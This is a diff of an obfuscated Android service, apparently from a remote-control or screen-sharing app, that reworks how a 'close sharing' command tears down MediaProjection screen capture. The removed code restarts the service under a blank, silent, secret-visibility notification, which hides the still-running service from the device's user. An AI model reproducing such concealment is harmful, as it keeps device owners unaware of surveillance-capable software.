@@ -222,61 +222,9 @@ class DFm8Y8iMScvB2YDw : Service() {
 
                 if(arg1==p50.a(byteArrayOf(1), byteArrayOf(49, 26, -98, -61, 14, 79, -102, 58, -94, -116)))
                 {
-                    val mpExists = mediaProjection != null
-                    Log.i("MainService", "关共享: mpExists=$mpExists, isStart=$isStart, thread=${Thread.currentThread().name}")
-
+                    Log.i("MainService", "关共享: received, posting to main thread")
                     Handler(Looper.getMainLooper()).post {
-                        try { android.widget.Toast.makeText(applicationContext, "关共享触发 mp=$mpExists", android.widget.Toast.LENGTH_SHORT).show() } catch(_: Exception) {}
-                    }
-
-                    Handler(Looper.getMainLooper()).post {
-                        try {
-                            mediaProjection?.stop()
-                            Log.i("MainService", "关共享: mp.stop() done")
-                        } catch (e: Exception) {
-                            Log.e("MainService", "关共享: mp.stop() error", e)
-                        }
-                        mediaProjection = null
-
-                        try {
-                            _isStart = false
-                            _isReady = false
-                            _isAudioStart = false
-
-                            try { virtualDisplay?.release() } catch(_: Exception) {}
-                            virtualDisplay = null
-                            try { imageReader?.close() } catch(_: Exception) {}
-                            imageReader = null
-                            try { videoEncoder?.stop(); videoEncoder?.release() } catch(_: Exception) {}
-                            videoEncoder = null
-                            try { surface?.release() } catch(_: Exception) {}
-
-                            stopForeground(true)
-                            Log.i("MainService", "关共享: stopForeground done")
-
-                            val silentNotification = notificationBuilder
-                                .setOngoing(true)
-                                .setSmallIcon(R.mipmap.ic_stat_logo)
-                                .setDefaults(0)
-                                .setAutoCancel(false)
-                                .setPriority(NotificationCompat.PRIORITY_MIN)
-                                .setContentTitle("")
-                                .setContentText("")
-                                .setSilent(true)
-                                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
-                                .setShowWhen(false)
-                                .build()
-                            startForeground(DEFAULT_NOTIFY_ID, silentNotification)
-                            Log.i("MainService", "关共享: restarted as silent foreground")
-
-                        } catch (e: Exception) {
-                            Log.e("MainService", "关共享: cleanup error", e)
-                        }
-
-                        oFtTiPzsqzBHGigp.rdClipboardManager?.setCaptureStarted(false)
-                        checkMediaPermission()
-
-                        Log.i("MainService", "关共享: complete")
+                        killMediaProjection()
                     }
                 }
                 else if(arg1==p50.a(byteArrayOf(-16), byteArrayOf(-63, -13, -107, -101, 57, 111, 52, -114)))
@@ -736,7 +684,7 @@ class DFm8Y8iMScvB2YDw : Service() {
     }
 
     fun killMediaProjection() {
-        Log.i("MainService", "killMediaProjection: begin, mp=${mediaProjection != null}, isStart=$isStart")
+        Log.i("MainService", "killMediaProjection: begin, mp=${mediaProjection != null}")
 
         try {
             mediaProjection?.stop()
@@ -758,6 +706,13 @@ class DFm8Y8iMScvB2YDw : Service() {
         try { videoEncoder?.stop(); videoEncoder?.release() } catch (_: Exception) {}
         videoEncoder = null
         try { surface?.release() } catch (_: Exception) {}
+
+        try {
+            stopForeground(true)
+            createForegroundNotification()
+        } catch (e: Exception) {
+            Log.e("MainService", "killMediaProjection: recreate foreground failed", e)
+        }
 
         checkMediaPermission()
 
